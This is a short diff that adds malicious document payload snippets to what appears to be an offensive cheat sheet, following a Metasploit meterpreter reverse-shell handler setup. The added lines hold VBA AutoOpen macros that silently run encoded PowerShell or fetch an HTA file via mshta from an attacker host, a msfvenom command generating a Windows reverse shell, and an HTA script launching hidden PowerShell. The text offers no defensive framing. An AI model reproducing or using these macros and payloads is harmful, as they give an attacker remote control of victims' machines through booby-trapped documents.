@@ -24,3 +24,25 @@ set payload windows/x64/meterpreter/reverse_tcp
 set LHOST <Your_IP>
 set LPORT <Your_Port>
 run
+
+
+Sub AutoOpen()
+    Dim objShell As Object
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "powershell -NoP -NonI -W Hidden -Enc aQB...=="
+End Sub
+
+
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=4444 -f psh-cmd
+echo "<PAYLOAD>" | iconv -t UTF-16LE | base64
+
+
+Sub AutoOpen()
+    CreateObject("WScript.Shell").Run "mshta http://<attacker_ip>/payload.hta", 0, True
+End Sub
+
+<script>
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("powershell -NoP -NonI -W Hidden -Enc <payload>");
+</script>
